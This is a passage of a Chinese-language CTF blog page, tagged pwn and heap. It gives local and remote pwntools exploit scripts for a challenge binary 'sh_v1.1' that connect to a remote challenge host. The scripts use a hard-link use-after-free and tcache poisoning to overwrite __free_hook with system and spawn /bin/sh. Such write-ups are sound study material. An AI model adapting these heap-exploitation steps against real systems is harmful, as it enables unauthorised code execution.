class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">filename=<span class="string">&#x27;sh_v1.1&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line"><span class="comment">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;121.40.89.206&#x27;</span>,<span class="number">34883</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;\n&#x27;</span></span>):</span><br><span class="line">  gdb.attach(p,cmd)</span><br><span class="line">  pause()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;cat &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">filename,filedata</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;touch &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line">  sl(<span class="built_in">str</span>(filedata))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">filename,filedata</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;gedit &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line">  sl(<span class="built_in">str</span>(filedata))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">filename</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;rm &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">src,dest</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;ln &#x27;</span>+<span class="built_in">str</span>(src)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(dest))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache</span></span><br><span class="line"><span class="comment"># file0 --&gt; file6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  touch(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(i),<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use to leak libc</span></span><br><span class="line"><span class="comment"># file7 == file8</span></span><br><span class="line">touch(<span class="string">&#x27;file7&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ln(<span class="string">&#x27;file7&#x27;</span>,<span class="string">&#x27;file8&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;file9&#x27;</span>,<span class="string">&#x27;cccccccc&#x27;</span>) <span class="comment"># escape for being combined into top chunk</span></span><br><span class="line"><span class="comment"># use to leak heap</span></span><br><span class="line"><span class="comment"># file1 == file10</span></span><br><span class="line">ln(<span class="string">&#x27;file1&#x27;</span>,<span class="string">&#x27;file10&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  rm(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">rm(<span class="string">&#x27;file7&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">cat(<span class="string">&#x27;file8&#x27;</span>)</span><br><span class="line">libc_addr=uu64(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">malloc_hook=libc_addr-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">libcbase=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">cat(<span class="string">&#x27;file10&#x27;</span>)</span><br><span class="line">heapbase=uu64(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])-<span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free hook</span></span><br><span class="line">payload=p64(free_hook)</span><br><span class="line">payload=payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">gedit(<span class="string">&#x27;file10&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">  touch(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(<span class="number">11</span>+i),<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;sys_addr&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">leak(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">leak(<span class="string">&#x27;libcbase&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">leak(<span class="string">&#x27;heapbase&#x27;</span>,<span class="built_in">hex</span>(heapbase))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get free_hook</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">touch(<span class="string">&#x27;file17&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">&#x27;file18&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">rm(<span class="string">&#x27;file18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>远程exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">filename=<span class="string">&#x27;sh_v1.1&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class="line"><span class="comment">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;121.40.89.206&#x27;</span>,<span class="number">34883</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;\n&#x27;</span></span>):</span><br><span class="line">  gdb.attach(p,cmd)</span><br><span class="line">  pause()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;cat &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">filename,filedata</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;touch &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line">  sl(<span class="built_in">str</span>(filedata))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">filename,filedata</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;gedit &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line">  sl(<span class="built_in">str</span>(filedata))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">filename</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;rm &#x27;</span>+<span class="built_in">str</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">src,dest</span>):</span><br><span class="line">  ru(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  sl(<span class="string">&#x27;ln &#x27;</span>+<span class="built_in">str</span>(src)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(dest))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache</span></span><br><span class="line"><span class="comment"># file0 --&gt; file6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  touch(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(i),<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use to leak libc</span></span><br><span class="line"><span class="comment"># file7 == file8</span></span><br><span class="line">touch(<span class="string">&#x27;file7&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ln(<span class="string">&#x27;file7&#x27;</span>,<span class="string">&#x27;file8&#x27;</span>)</span><br><span class="line">touch(<span class="string">&#x27;file9&#x27;</span>,<span class="string">&#x27;cccccccc&#x27;</span>) <span class="comment"># escape for being combined into top chunk</span></span><br><span class="line"><span class="comment"># use to leak heap</span></span><br><span class="line"><span class="comment"># file1 == file10</span></span><br><span class="line">ln(<span class="string">&#x27;file1&#x27;</span>,<span class="string">&#x27;file10&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  rm(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">rm(<span class="string">&#x27;file7&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">cat(<span class="string">&#x27;file8&#x27;</span>)</span><br><span class="line">libc_addr=uu64(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">malloc_hook=libc_addr-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">cat(<span class="string">&#x27;file10&#x27;</span>)</span><br><span class="line">heapbase=uu64(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])-<span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">libcbase=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">sys_addr=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;sys_addr&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">leak(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">leak(<span class="string">&#x27;libcbase&#x27;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">leak(<span class="string">&#x27;heapbase&#x27;</span>,<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_hook</span></span><br><span class="line">payload=p64(free_hook)</span><br><span class="line">payload=payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">gedit(<span class="string">&#x27;file10&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">  touch(<span class="string">&#x27;file&#x27;</span>+<span class="built_in">str</span>(<span class="number">11</span>+i),<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get free_hook</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">touch(<span class="string">&#x27;file17&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">touch(<span class="string">&#x27;file18&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">rm(<span class="string">&#x27;file18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/08/BaiLu-note2/" rel="prev" title="BaiLu_note2">
+      <i class="fa fa-chevron-left"></i> BaiLu_note2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/14/QWB-core/" rel="next" title="QWB_core">
+      QWB_core <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
